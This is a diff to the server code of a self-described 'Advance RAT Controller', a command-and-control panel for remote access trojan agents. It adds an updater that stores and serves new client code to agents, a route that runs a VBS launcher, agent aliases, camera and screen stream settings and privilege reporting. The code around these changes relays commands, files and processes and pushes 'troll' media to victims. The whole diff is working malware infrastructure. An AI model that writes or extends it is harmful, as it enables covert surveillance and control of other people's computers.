@@ -22,6 +22,7 @@ from flask_caching import Cache
 from prometheus_flask_exporter import PrometheusMetrics
 from pythonjsonlogger import jsonlogger
 import logging
+import subprocess
 import bleach
 from markupsafe import escape
 from models import SessionLocal, engine, Base, Agent as DbAgent, CommandHistory as DbCommandHistory, ActivityLog as DbActivityLog, AgentGroup as DbAgentGroup, AgentGroupMembership as DbAgentGroupMembership, AuditLog as DbAuditLog
@@ -254,7 +255,11 @@ class Config:
     """Configuration class for Advance RAT Controller"""
     
     # Admin Authentication
-    ADMIN_PASSWORD = os.environ.get('ADMIN_PASSWORD')
+    ADMIN_PASSWORD = (
+        os.environ.get('ADMIN_PASSWORD')
+        or os.environ.get('Admin_Password')
+        or os.environ.get('admin_password')
+    )
     
     # Validate password strength
     if ADMIN_PASSWORD:
@@ -517,6 +522,49 @@ def save_settings(data: dict) -> bool:
     except Exception as e:
         print(f"Failed to save settings.json: {e}")
         return False
+
+# Updater storage
+UPDATER_DIR = os.path.join(os.path.dirname(__file__), 'updates')
+UPDATER_STATE_PATH = os.path.join(UPDATER_DIR, 'updater_state.json')
+UPDATER_CLIENT_PATH = os.path.join(UPDATER_DIR, 'client_latest.py')
+
+def _ensure_updater_dir():
+    try:
+        os.makedirs(UPDATER_DIR, exist_ok=True)
+    except Exception:
+        pass
+
+def _compute_md5(path: str) -> str:
+    try:
+        h = hashlib.md5()
+        with open(path, 'rb') as f:
+            for chunk in iter(lambda: f.read(8192), b''):
+                h.update(chunk)
+        return h.hexdigest()
+    except Exception:
+        return ''
+
+def _read_updater_state() -> dict:
+    _ensure_updater_dir()
+    state = {}
+    try:
+        if os.path.exists(UPDATER_STATE_PATH):
+            with open(UPDATER_STATE_PATH, 'r', encoding='utf-8', errors='ignore') as f:
+                state = json.load(f)
+    except Exception:
+        state = {}
+    if 'download_url' not in state or not state.get('download_url'):
+        try:
+            state['download_url'] = url_for('download_updater_file', filename='client_latest.py', _external=True)
+        except Exception:
+            try:
+                base = request.url_root.rstrip('/')
+            except Exception:
+                base = f"http://{Config.HOST}:{Config.PORT}"
+            state['download_url'] = base + "/download/updater/client_latest.py"
+    if ('md5' not in state or not state.get('md5')) and os.path.exists(UPDATER_CLIENT_PATH):
+        state['md5'] = _compute_md5(UPDATER_CLIENT_PATH)
+    return state
 
 # Now that settings helpers exist, configure CORS and Socket.IO
 allowed_origins = [
@@ -1587,10 +1635,15 @@ def login():
                 "window.__API_URL__ = window.__SOCKET_URL__;"
                 "</script>"
             )
+            fav_png = '<link rel="icon" href="/favicon.png" type="image/png" sizes="64x64" />'
+            fav_ico = '<link rel="shortcut icon" href="/neural.ico" type="image/x-icon" />'
+            fav_tags = fav_png + fav_ico
             if "</head>" in index_html:
+                if fav_png not in index_html and fav_ico not in index_html:
+                    index_html = index_html.replace("<head>", "<head>" + fav_tags)
                 modified = index_html.replace("</head>", runtime_overrides + "</head>")
             else:
-                modified = runtime_overrides + index_html
+                modified = fav_tags + runtime_overrides + index_html
             return Response(modified, mimetype='text/html')
         else:
             # Fallback for when build is missing - just redirect to dashboard logic which handles errors
@@ -2626,10 +2679,16 @@ def dashboard():
                 "</script>"
             )
             if "</head>" in index_html:
+                fav_png = '<link rel="icon" href="/favicon.png" type="image/png" sizes="64x64" />'
+                fav_ico = '<link rel="shortcut icon" href="/neural.ico" type="image/x-icon" />'
+                tags = fav_png + fav_ico
+                if fav_png not in index_html and fav_ico not in index_html:
+                    index_html = index_html.replace("<head>", "<head>" + tags)
                 modified = index_html.replace("</head>", runtime_overrides + "</head>")
             else:
                 # Fallback: prepend overrides at top
-                modified = runtime_overrides + index_html
+                tags = '<link rel="icon" href="/favicon.png" type="image/png" sizes="64x64" /><link rel="shortcut icon" href="/neural.ico" type="image/x-icon" />'
+                modified = tags + runtime_overrides + index_html
             return Response(modified, mimetype='text/html')
         else:
             # If index.html isn't found, try direct asset inlining as a secondary strategy
@@ -2666,6 +2725,8 @@ def dashboard():
               <head>
                 <meta charset=\"UTF-8\" />
                 <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\" />
+                <link rel=\"icon\" href=\"/favicon.png\" type=\"image/png\" sizes=\"64x64\" />
+                <link rel=\"shortcut icon\" href=\"/neural.ico\" type=\"image/x-icon\" />
                 <title>Agent Controller</title>
                 <style>{css_inline}</style>
                 {runtime_overrides}
@@ -2729,6 +2790,52 @@ def debug_assets():
                 pass
         out.append({'dir': d, 'exists': exists, 'files': files})
     return jsonify(out)
+
+@app.route('/favicon.png')
+def serve_favicon_png():
+    try:
+        base_dir = os.path.dirname(__file__)
+        icon_path = os.path.join(base_dir, 'neural.ico')
+        try:
+            from PIL import Image, ImageDraw
+            import io
+            size = 64
+            im = Image.open(icon_path)
+            im = im.convert('RGBA')
+            im = im.resize((size, size), Image.LANCZOS)
+            mask = Image.new('L', (size, size), 0)
+            d = ImageDraw.Draw(mask)
+            d.ellipse((0, 0, size, size), fill=255)
+            out = Image.new('RGBA', (size, size), (0, 0, 0, 0))
+            out.paste(im, (0, 0), mask=mask)
+            buf = io.BytesIO()
+            out.save(buf, format='PNG')
+            buf.seek(0)
+            return Response(buf.read(), mimetype='image/png')
+        except Exception:
+            pass
+        return send_file(icon_path, mimetype='image/x-icon')
+    except Exception:
+        return ("", 404)
+
+@app.route('/neural.ico')
+def serve_neural_icon():
+    try:
+        base_dir = os.path.dirname(__file__)
+        candidates = [
+            os.path.join(base_dir, 'neural.ico'),
+            os.path.join(base_dir, 'agent-controller ui v2.1', 'neural.ico'),
+        ]
+        for p in candidates:
+            if os.path.isfile(p):
+                return send_file(p, mimetype='image/x-icon')
+    except Exception:
+        pass
+    return ("", 404)
+
+@app.route('/favicon.ico')
+def serve_favicon():
+    return serve_neural_icon()
 # --- Real-time Streaming Endpoints (COMMENTED OUT - REPLACED WITH OVERVIEW) ---
 # 
 # STREAMING OPTIMIZATION FOR REAL-TIME MONITORING:
@@ -3727,6 +3834,30 @@ def api_trusted_device_toggle():
 # --- NEW API ENDPOINTS FOR MODERN UI ---
 
 # Agent Management API
+def _load_agent_alias(agent_id: str):
+    try:
+        base_dir = os.path.join(os.getcwd(), 'agents', agent_id)
+        path = os.path.join(base_dir, 'alias')
+        if os.path.exists(path):
+            with open(path, 'r', encoding='utf-8') as f:
+                s = f.read().strip()
+                if s:
+                    return s
+        try:
+            agent_name = str(AGENTS_DATA.get(agent_id, {}).get('name') or f'Agent-{agent_id}')
+            safe_base = re.sub(r'[^A-Za-z0-9._-]+', '_', agent_name).strip('_') or f'Agent_{agent_id}'
+            legacy_dir = os.path.join(os.getcwd(), 'aliases')
+            legacy_path = os.path.join(legacy_dir, f"{safe_base}.alias")
+            if os.path.exists(legacy_path):
+                with open(legacy_path, 'r', encoding='utf-8') as f:
+                    s = f.read().strip()
+                    if s:
+                        return s
+        except Exception:
+            pass
+        return None
+    except Exception:
+        return None
 @app.route('/api/agents', methods=['GET'])
 @require_auth
 @cache.cached(timeout=5)
@@ -3737,6 +3868,7 @@ def get_agents():
         agent_info = {
             'id': agent_id,
             'name': data.get('name', f'Agent-{agent_id}'),
+            'alias': data.get('alias') or _load_agent_alias(agent_id),
             'status': 'online' if data.get('sid') else 'offline',
             'platform': data.get('platform', 'Unknown'),
             'ip': data.get('ip', '0.0.0.0'),
@@ -3768,6 +3900,7 @@ def get_agent_details(agent_id):
     agent_info = {
         'id': agent_id,
         'name': data.get('name', f'Agent-{agent_id}'),
+        'alias': data.get('alias') or _load_agent_alias(agent_id),
         'status': 'online' if data.get('sid') else 'offline',
         'platform': data.get('platform', 'Unknown'),
         'ip': data.get('ip', '0.0.0.0'),
@@ -3784,6 +3917,57 @@ def get_agent_details(agent_id):
     }
     
     return jsonify(agent_info)
+
+@app.route('/api/agents/<agent_id>/alias', methods=['POST'])
+@require_auth
+def set_agent_alias(agent_id):
+    try:
+        if agent_id not in AGENTS_DATA:
+            return jsonify({'success': False, 'error': 'Agent not found'}), 404
+        if not request.is_json:
+            return jsonify({'success': False, 'error': 'JSON payload required'}), 400
+        raw = str((request.json or {}).get('alias') or '').strip()
+        alias = sanitize_input(raw)
+        base_dir = os.path.join(os.getcwd(), 'agents', agent_id)
+        try:
+            os.makedirs(base_dir, exist_ok=True)
+        except Exception:
+            pass
+        filename = 'alias'
+        path = os.path.join(base_dir, filename)
+        if alias:
+            try:
+                with open(path, 'w', encoding='utf-8') as f:
+                    f.write(alias)
+            except Exception as e:
+                return jsonify({'success': False, 'error': f'Failed to write alias file: {e}'}), 500
+            AGENTS_DATA[agent_id]['alias'] = alias
+        else:
+            try:
+                if os.path.exists(path):
+                    os.remove(path)
+            except Exception:
+                pass
+            try:
+                agent_name = str(AGENTS_DATA.get(agent_id, {}).get('name') or f'Agent-{agent_id}')
+                safe_base = re.sub(r'[^A-Za-z0-9._-]+', '_', agent_name).strip('_') or f'Agent_{agent_id}'
+                legacy_dir = os.path.join(os.getcwd(), 'aliases')
+                legacy_path = os.path.join(legacy_dir, f"{safe_base}.alias")
+                if os.path.exists(legacy_path):
+                    os.remove(legacy_path)
+            except Exception:
+                pass
+            try:
+                if 'alias' in AGENTS_DATA.get(agent_id, {}):
+                    del AGENTS_DATA[agent_id]['alias']
+            except Exception:
+                pass
+        cache.delete('view//api/agents')
+        socketio.emit('agent_alias_update', {'agent_id': agent_id, 'alias': alias, 'filename': filename, 'timestamp': time.time()}, room='operators')
+        socketio.emit('agent_list_update', _agents_payload(), room='operators')
+        return jsonify({'success': True, 'agent_id': agent_id, 'alias': alias, 'file': filename})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/api/agents/<agent_id>/token/generate', methods=['POST'])
 @require_auth
@@ -3818,18 +4002,19 @@ def start_stream(agent_id, stream_type):
         'type': stream_type,
         'quality': quality
     }, room=agent_sid)
-    # Push stream params for screen including delta tile settings
     try:
         if stream_type == 'screen':
             if quality == 'low':
-                params = {'type': 'screen', 'fps': 15, 'max_width': 854, 'jpeg_quality': 50, 'delta': True, 'tile_size': 64, 'diff_threshold': 12}
+                params = {'type': 'screen', 'fps': fps, 'max_width': 854, 'jpeg_quality': 50, 'delta': True, 'tile_size': 64, 'diff_threshold': 12}
             elif quality == 'medium':
-                params = {'type': 'screen', 'fps': 15, 'max_width': 1280, 'jpeg_quality': 60, 'delta': True, 'tile_size': 64, 'diff_threshold': 8}
+                params = {'type': 'screen', 'fps': fps, 'max_width': 1280, 'jpeg_quality': 60, 'delta': True, 'tile_size': 64, 'diff_threshold': 8}
             elif quality == 'high':
-                params = {'type': 'screen', 'fps': 20, 'max_width': 1280, 'jpeg_quality': 70, 'delta': True, 'tile_size': 64, 'diff_threshold': 6}
+                params = {'type': 'screen', 'fps': fps, 'max_width': 1280, 'jpeg_quality': 70, 'delta': True, 'tile_size': 64, 'diff_threshold': 6}
             else:
-                params = {'type': 'screen', 'fps': 25, 'max_width': 1920, 'jpeg_quality': 75, 'delta': True, 'tile_size': 64, 'diff_threshold': 5}
+                params = {'type': 'screen', 'fps': fps, 'max_width': 1920, 'jpeg_quality': 75, 'delta': True, 'tile_size': 64, 'diff_threshold': 5}
             socketio.emit('set_stream_params', params, room=agent_sid)
+        elif stream_type == 'camera':
+            socketio.emit('set_stream_params', {'type': 'camera', 'fps': fps}, room=agent_sid)
     except Exception:
         pass
     if stream_type == 'screen':
@@ -4443,6 +4628,82 @@ def download_staged_file(upload_id, filename):
     resp = send_file(path, as_attachment=True, download_name=filename)
     resp.headers['Cache-Control'] = 'private, max-age=600'
     return resp
+
+@app.route('/download/updater/<path:filename>', methods=['GET'])
+def download_updater_file(filename):
+    _ensure_updater_dir()
+    path = os.path.join(UPDATER_DIR, filename)
+    if not os.path.isfile(path):
+        return jsonify({'error': 'Not found'}), 404
+    return send_file(path, as_attachment=True, download_name=os.path.basename(filename))
+
+@app.route('/api/updater/latest', methods=['GET'])
+@require_auth
+def get_updater_latest():
+    state = _read_updater_state()
+    if os.path.exists(UPDATER_CLIENT_PATH):
+        try:
+            size = os.path.getsize(UPDATER_CLIENT_PATH)
+        except Exception:
+            size = 0
+    else:
+        size = 0
+    return jsonify({
+        'version': str(state.get('version') or ''),
+        'md5': str(state.get('md5') or ''),
+        'download_url': str(state.get('download_url') or ''),
+        'last_push': str(state.get('last_push') or ''),
+        'size': size
+    })
+
+@app.route('/api/updater/push', methods=['POST'])
+@require_auth
+def push_updater():
+    try:
+        data = request.get_json(force=True) or {}
+    except Exception:
+        data = {}
+    code = str(data.get('code') or '')
+    version = str(data.get('version') or '')
+    if not code:
+        return jsonify({'error': 'Code required'}), 400
+    _ensure_updater_dir()
+    try:
+        with open(UPDATER_CLIENT_PATH, 'w', encoding='utf-8', errors='ignore') as f:
+            f.write(code)
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+    md5 = _compute_md5(UPDATER_CLIENT_PATH)
+    if not version:
+        version = str(int(time.time()))
+    try:
+        dl = url_for('download_updater_file', filename='client_latest.py', _external=True)
+    except Exception:
+        dl = request.url_root.rstrip('/') + "/download/updater/client_latest.py"
+    state = {
+        'version': version,
+        'md5': md5,
+        'download_url': dl,
+        'last_push': datetime.datetime.utcnow().isoformat() + 'Z'
+    }
+    try:
+        with open(UPDATER_STATE_PATH, 'w', encoding='utf-8', errors='ignore') as f:
+            json.dump(state, f, indent=2)
+    except Exception:
+        pass
+    return jsonify(state)
+
+@app.route('/api/system/update-agent', methods=['POST'])
+@require_auth
+def update_agent():
+    try:
+        vbs_path = os.path.join(os.path.dirname(__file__), 'client_launcher.vbs')
+        if not os.path.exists(vbs_path):
+            return jsonify({'error': 'client_launcher.vbs not found'}), 404
+        result = subprocess.run(['wscript.exe', vbs_path], cwd=os.path.dirname(__file__), capture_output=True, text=True, timeout=60)
+        return jsonify({'success': True, 'exit_code': result.returncode, 'stdout': (result.stdout or '')[:2000], 'stderr': (result.stderr or '')[:2000]})
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
 
 @app.route('/api/agents/<agent_id>/files/upload_pscurl', methods=['POST'])
 @require_auth
@@ -5464,7 +5725,7 @@ def handle_disconnect():
             AGENTS_DATA[disconnected_agent_id]["sid"] = None
         except Exception:
             pass
-        emit('agent_list_update', _agents_payload(), room='operators', broadcast=True)
+        emit('agent_list_update', _agents_payload(), room='operators')
         
         # Log activity
         emit('activity_update', {
@@ -5476,7 +5737,7 @@ def handle_disconnect():
             'agent_name': disconnected_agent_name,
             'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
             'status': 'warning'
-        }, room='operators', broadcast=True)
+        }, room='operators')
         
         print(f"Agent {disconnected_agent_id} disconnected.")
     else:
@@ -5537,7 +5798,7 @@ def _emit_agent_config(agent_id: str):
                 'bypasses': payload.get('bypasses') or {},
                 'registry': payload.get('registry') or {},
             }
-            emit('config_update', ops_payload, room='operators', broadcast=True)
+            emit('config_update', ops_payload, room='operators')
         except Exception:
             pass
     except Exception:
@@ -5558,7 +5819,7 @@ def handle_operator_toggle_feature(data):
             if sid:
                 emit('feature_toggle', {'feature': feature, 'enabled': enabled, 'timestamp': ts}, room=sid)
         else:
-            emit('feature_toggle', {'feature': feature, 'enabled': enabled, 'timestamp': ts}, room='agents', broadcast=True)
+            emit('feature_toggle', {'feature': feature, 'enabled': enabled, 'timestamp': ts}, room='agents')
         emit('activity_update', {
             'id': f'act_{int(time.time())}',
             'type': 'toggle',
@@ -5566,7 +5827,7 @@ def handle_operator_toggle_feature(data):
             'details': f'{feature} {"enabled" if enabled else "disabled"}',
             'timestamp': ts,
             'status': 'success'
-        }, room='operators', broadcast=True)
+        }, room='operators')
     except Exception as e:
         print(f"Error handling operator_toggle_feature: {e}")
     except Exception:
@@ -5589,11 +5850,11 @@ def handle_troll_show_image(data):
             if sid:
                 emit('troll_show_image', payload, room=sid)
                 # Also emit to operators room for frontend notifications
-                emit('troll_show_image', {**payload, 'agent_id': agent_id}, room='operators', broadcast=True)
+                emit('troll_show_image', {**payload, 'agent_id': agent_id}, room='operators')
         else:
-            emit('troll_show_image', payload, room='agents', broadcast=True)
+            emit('troll_show_image', payload, room='agents')
             # Also emit to operators room for frontend notifications
-            emit('troll_show_image', payload, room='operators', broadcast=True)
+            emit('troll_show_image', payload, room='operators')
         emit('activity_update', {
             'id': f'act_{int(time.time())}',
             'type': 'troll',
@@ -5601,7 +5862,7 @@ def handle_troll_show_image(data):
             'details': payload.get('filename') or '',
             'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
             'status': 'success'
-        }, room='operators', broadcast=True)
+        }, room='operators')
     except Exception:
         pass
 
@@ -5621,11 +5882,11 @@ def handle_troll_show_video(data):
             if sid:
                 emit('troll_show_video', payload, room=sid)
                 # Also emit to operators room for frontend notifications
-                emit('troll_show_video', {**payload, 'agent_id': agent_id}, room='operators', broadcast=True)
+                emit('troll_show_video', {**payload, 'agent_id': agent_id}, room='operators')
         else:
-            emit('troll_show_video', payload, room='agents', broadcast=True)
+            emit('troll_show_video', payload, room='agents')
             # Also emit to operators room for frontend notifications
-            emit('troll_show_video', payload, room='operators', broadcast=True)
+            emit('troll_show_video', payload, room='operators')
         emit('activity_update', {
             'id': f'act_{int(time.time())}',
             'type': 'troll',
@@ -5633,7 +5894,7 @@ def handle_troll_show_video(data):
             'details': payload.get('filename') or '',
             'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
             'status': 'success'
-        }, room='operators', broadcast=True)
+        }, room='operators')
     except Exception:
         pass
 
@@ -5687,6 +5948,42 @@ def handle_agent_connect(data):
         AGENTS_DATA[agent_id]["network_usage"] = data.get('network_usage', 0)
         AGENTS_DATA[agent_id]["system_info"] = data.get('system_info', {})
         AGENTS_DATA[agent_id]["uptime"] = data.get('uptime', 0)
+        try:
+            raw_alias = data.get('alias')
+            alias = sanitize_input(str(raw_alias or '').strip())
+            if alias:
+                AGENTS_DATA[agent_id]['alias'] = alias
+                try:
+                    base_dir = os.path.join(os.getcwd(), 'agents', agent_id)
+                    os.makedirs(base_dir, exist_ok=True)
+                    with open(os.path.join(base_dir, 'alias'), 'w', encoding='utf-8') as f:
+                        f.write(alias)
+                except Exception:
+                    pass
+            else:
+                existing_alias = _load_agent_alias(agent_id)
+                if existing_alias:
+                    AGENTS_DATA[agent_id]['alias'] = existing_alias
+                else:
+                    try:
+                        if 'alias' in AGENTS_DATA.get(agent_id, {}):
+                            del AGENTS_DATA[agent_id]['alias']
+                    except Exception:
+                        pass
+        except Exception:
+            pass
+        try:
+            AGENT_OVERRIDES['admin'][agent_id] = bool(AGENTS_DATA[agent_id]["is_admin"])
+        except Exception:
+            pass
+        try:
+            socketio.emit('agent_privilege_update', {
+                'agent_id': agent_id,
+                'is_admin': bool(AGENTS_DATA[agent_id]["is_admin"]),
+                'timestamp': time.time()
+            }, room='operators')
+        except Exception:
+            pass
         
         join_room('agents')
         
@@ -5717,7 +6014,7 @@ def handle_agent_connect(data):
             pass
         
         # Notify all operators of the new agent
-        emit('agent_list_update', _agents_payload(), room='operators', broadcast=True)
+        emit('agent_list_update', _agents_payload(), room='operators')
         
         # Log activity
         emit('activity_update', {
@@ -5729,7 +6026,7 @@ def handle_agent_connect(data):
             'agent_name': AGENTS_DATA[agent_id]["name"],
             'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
             'status': 'success'
-        }, room='operators', broadcast=True)
+        }, room='operators')
         print(f"Agent {agent_id} connected with SID {request.sid}")
         print(f"🔍 Controller: Agent registration successful. AGENTS_DATA now contains: {list(AGENTS_DATA.keys())}")
         try:
@@ -5788,19 +6085,19 @@ def handle_process_list(data):
     """Agent sends structured process list; relay to operators."""
     agent_id = data.get('agent_id')
     processes = data.get('processes', [])
-    emit('process_list', {'agent_id': agent_id, 'processes': processes}, room='operators', broadcast=True)
+    emit('process_list', {'agent_id': agent_id, 'processes': processes}, room='operators')
 
 @socketio.on('process_operation_result')
 def handle_process_operation_result(data):
-    emit('process_operation_result', data, room='operators', broadcast=True)
+    emit('process_operation_result', data, room='operators')
 
 @socketio.on('process_details_response')
 def handle_process_details_response(data):
-    emit('process_details_response', data, room='operators', broadcast=True)
+    emit('process_details_response', data, room='operators')
 
 @socketio.on('registry_presence')
 def handle_registry_presence(data):
-    emit('registry_presence', data, room='operators', broadcast=True)
+    emit('registry_presence', data, room='operators')
 
 @socketio.on('file_list')
 def handle_file_list(data):
@@ -5808,18 +6105,22 @@ def handle_file_list(data):
     agent_id = data.get('agent_id')
     path = data.get('path', '/')
     files = data.get('files', [])
-    emit('file_list', {'agent_id': agent_id, 'path': path, 'files': files}, room='operators', broadcast=True)
+    emit('file_list', {'agent_id': agent_id, 'path': path, 'files': files}, room='operators')
 
 @socketio.on('file_upload_debug')
 def handle_file_upload_debug(data):
     try:
-        emit('file_upload_debug', data, room='operators', broadcast=True)
+        emit('file_upload_debug', data, room='operators')
     except Exception:
         pass
 @socketio.on('file_op_result')
 def handle_file_op_result(data):
     """Relay file operation result to operators."""
-    emit('file_op_result', data, room='operators', broadcast=True)
+    emit('file_op_result', data, room='operators')
+
+@socketio.on('agent_response')
+def handle_agent_response(data):
+    emit('agent_response', data, room='operators')
 
 @socketio.on('command_output')
 def handle_command_output(data):
@@ -5828,7 +6129,7 @@ def handle_command_output(data):
     output = data.get('output')
     
     # Forward the output to all operator dashboards
-    emit('command_output', {'agent_id': agent_id, 'output': output}, room='operators', broadcast=True)
+    emit('command_output', {'agent_id': agent_id, 'output': output}, room='operators')
     print(f"Received output from {agent_id}: {output[:100]}...")
 
 @socketio.on('get_monitors')
@@ -5840,7 +6141,7 @@ def handle_get_monitors(data):
 
 @socketio.on('monitors_list')
 def handle_monitors_list(data):
-    emit('monitors_list_update', data, room='operators', broadcast=True)
+    emit('monitors_list_update', data, room='operators')
 
 @socketio.on('switch_monitor')
 def handle_switch_monitor_request(data):
@@ -5943,7 +6244,7 @@ def handle_screenshot_response(data):
         if target_sid:
             emit('screenshot_response', data, room=target_sid)
         else:
-            emit('screenshot_response', data, room='operators', broadcast=True)
+            emit('screenshot_response', data, room='operators')
     except Exception as e:
         print(f"[SCREENSHOT] Error in handle_screenshot_response: {e}")
 @socketio.on('agent_heartbeat')
@@ -5959,7 +6260,7 @@ def handle_agent_heartbeat(data):
     if not AGENTS_DATA[agent_id].get('name'):
         AGENTS_DATA[agent_id]['name'] = f'Agent-{agent_id}'
     if prev_sid != request.sid:
-        emit('agent_list_update', _agents_payload(), room='operators', broadcast=True)
+        emit('agent_list_update', _agents_payload(), room='operators')
 
 @socketio.on('ping')
 def handle_ping(data):
@@ -5980,7 +6281,7 @@ def handle_ping(data):
         
         if handle_ping.ping_count[agent_id] % 10 == 0:
             print(f"Updating operators with agent {agent_id} status after {handle_ping.ping_count[agent_id]} pings")
-            emit('agent_list_update', _agents_payload(), room='operators', broadcast=True)
+            emit('agent_list_update', _agents_payload(), room='operators')
     
     # Send pong response
     emit('pong', {
@@ -6042,7 +6343,7 @@ def handle_agent_register(data):
         
         # Notify operators
         print(f"Broadcasting agent_list_update to operators room with agent data: {list(AGENTS_DATA.keys())}")
-        emit('agent_list_update', _agents_payload(), room='operators', broadcast=True)
+        emit('agent_list_update', _agents_payload(), room='operators')
         try:
             _emit_agent_config(agent_id)
         except Exception:
@@ -6058,7 +6359,7 @@ def handle_agent_register(data):
             'agent_name': AGENTS_DATA[agent_id]["name"],
             'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
             'status': 'success'
-        }, room='operators', broadcast=True)
+        }, room='operators')
         
         # Send registration confirmation
         emit('agent_registered', {
@@ -6475,7 +6776,10 @@ def handle_client_update_check(data):
         incoming_hash = (data or {}).get('sha256') or ''
         incoming_version = (data or {}).get('version') or ''
         requester_sid = request.sid
-        path = os.path.join(os.getcwd(), 'client.py')
+        try:
+            path = UPDATER_CLIENT_PATH if os.path.isfile(UPDATER_CLIENT_PATH) else os.path.join(os.getcwd(), 'client.py')
+        except Exception:
+            path = os.path.join(os.getcwd(), 'client.py')
         try:
             with open(path, 'rb') as f:
                 raw = f.read()
@@ -6515,7 +6819,10 @@ def handle_broadcast_client_update(data):
     try:
         code = (data or {}).get('code')
         if not isinstance(code, str) or len(code) < 100:
-            path = os.path.join(os.getcwd(), 'client.py')
+            try:
+                path = UPDATER_CLIENT_PATH if os.path.isfile(UPDATER_CLIENT_PATH) else os.path.join(os.getcwd(), 'client.py')
+            except Exception:
+                path = os.path.join(os.getcwd(), 'client.py')
             with open(path, 'rb') as f:
                 raw = f.read()
             code = raw.decode('utf-8', errors='replace')
@@ -6609,18 +6916,11 @@ def _ensure_buffered_emitter(agent_id: str, stream_type: str):
             fps = max(1, int(STREAM_PLAYBACK_FPS_SCREEN[agent_id] or 10))
             buf_frames = max(1, int(STREAM_BUFFER_FRAMES_SCREEN[agent_id] or 30))
             def _run():
-                started = False
+                started = True
                 interval = 1.0 / float(fps)
                 next_tick = time.perf_counter()
                 while STREAM_PLAYBACK_MODE_SCREEN[agent_id] == 'buffered':
                     buf = STREAM_FRAME_BUFFER_SCREEN[agent_id]
-                    if not started:
-                        if len(buf) >= buf_frames:
-                            started = True
-                            next_tick = time.perf_counter()
-                        else:
-                            time.sleep(0.05)
-                            continue
                     if len(buf) > buf_frames * 2:
                         while len(buf) > buf_frames:
                             buf.popleft()
@@ -6927,6 +7227,7 @@ def handle_agent_telemetry(data):
         AGENTS_DATA[agent_id]['cpu_usage'] = data.get('cpu', 0)
         AGENTS_DATA[agent_id]['memory_usage'] = data.get('memory', 0)
         AGENTS_DATA[agent_id]['network_usage'] = data.get('network', 0)
+        AGENTS_DATA[agent_id]['last_seen'] = datetime.datetime.utcnow().isoformat() + "Z"
         try:
             latency = float(data.get('latency_ms') or data.get('latency') or 0)
             loss = float(data.get('packet_loss') or 0)
@@ -6940,7 +7241,13 @@ def handle_agent_telemetry(data):
                 AGENT_FEATURE_FLAGS[agent_id]['quality_level'] = q
         except Exception:
             pass
-        emit('agent_list_update', _agents_payload(), room='operators', broadcast=True)
+        emit('agent_telemetry', {
+            'agent_id': agent_id,
+            'cpu': AGENTS_DATA[agent_id]['cpu_usage'],
+            'memory': AGENTS_DATA[agent_id]['memory_usage'],
+            'network': AGENTS_DATA[agent_id]['network_usage']
+        }, room='operators')
+        emit('agent_list_update', _agents_payload(), room='operators')
 
 # --- WebRTC Socket.IO Event Handlers ---
 
@@ -7852,7 +8159,7 @@ def handle_performance_update(data):
                 'memory': data.get('memory_usage', 0),
                 'network': data.get('network_usage', 0)
             }
-        }, room='operators', broadcast=True)
+        }, room='operators')
 
 @socketio.on('command_result')
 def handle_command_result(data):
@@ -7916,7 +8223,7 @@ def handle_command_result(data):
         pass
     
     print(f"🔍 Controller: Broadcasting to operators room: {result_data}")
-    emit('command_result', result_data, room='operators', broadcast=True)
+    emit('command_result', result_data, room='operators')
     print(f"🔍 Controller: Command result broadcasted successfully")
     
     # Log activity
@@ -7930,7 +8237,7 @@ def handle_command_result(data):
             'agent_name': AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}"),
             'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
             'status': 'success' if success else 'error'
-        }, room='operators', broadcast=True)
+        }, room='operators')
         try:
             email_cfg = load_settings().get('email', {})
             if email_cfg.get('enabled') and email_cfg.get('notifyCommandFailure') and not success:
@@ -7954,7 +8261,7 @@ def handle_command_result(data):
                     'agent_id': agent_id,
                     'read': False,
                     'category': 'security'
-                }, room='operators', broadcast=True)
+                }, room='operators')
             elif ('registry' in lc) or ('reg ' in lc) or ('policy' in lc):
                 emit('agent_notification', {
                     'id': f'notif_{int(time.time())}_{secrets.token_hex(3)}',
@@ -7965,7 +8272,7 @@ def handle_command_result(data):
                     'agent_id': agent_id,
                     'read': False,
                     'category': 'security'
-                }, room='operators', broadcast=True)
+                }, room='operators')
         except Exception:
             pass
 
@@ -7984,7 +8291,7 @@ def handle_stream_status(data):
         'status': status,
         'quality': quality,
         'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'
-    }, room='operators', broadcast=True)
+    }, room='operators')
     
     # Log activity
     if agent_id in AGENTS_DATA:
@@ -7998,7 +8305,7 @@ def handle_stream_status(data):
             'agent_name': AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}"),
             'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
             'status': 'success' if status in ['started', 'stopped'] else 'error'
-        }, room='operators', broadcast=True)
+        }, room='operators')
 
 @socketio.on('file_operation_result')
 def handle_file_operation_result(data):
@@ -8019,7 +8326,7 @@ def handle_file_operation_result(data):
         'error_message': error_message,
         'file_size': file_size,
         'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'
-    }, room='operators', broadcast=True)
+    }, room='operators')
     
     # Log activity
     if agent_id in AGENTS_DATA:
@@ -8037,7 +8344,7 @@ def handle_file_operation_result(data):
             'agent_name': AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}"),
             'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
             'status': 'success' if success else 'error'
-    }, room='operators', broadcast=True)
+        }, room='operators')
 
 @socketio.on('system_alert')
 def handle_system_alert(data):
@@ -8054,7 +8361,7 @@ def handle_system_alert(data):
         'message': message,
         'details': details,
         'timestamp': datetime.datetime.utcnow().isoformat() + 'Z'
-    }, room='operators', broadcast=True)
+    }, room='operators')
     
     # Log activity
     if agent_id in AGENTS_DATA:
@@ -8067,11 +8374,11 @@ def handle_system_alert(data):
             'agent_name': AGENTS_DATA[agent_id].get("name", f"Agent-{agent_id}"),
             'timestamp': datetime.datetime.utcnow().isoformat() + 'Z',
             'status': 'error' if alert_type in ['error', 'critical'] else 'warning'
-        }, room='operators', broadcast=True)
+        }, room='operators')
 
 @socketio.on('agent_notification')
 def handle_agent_notification(data):
-    emit('agent_notification', data, room='operators', broadcast=True)
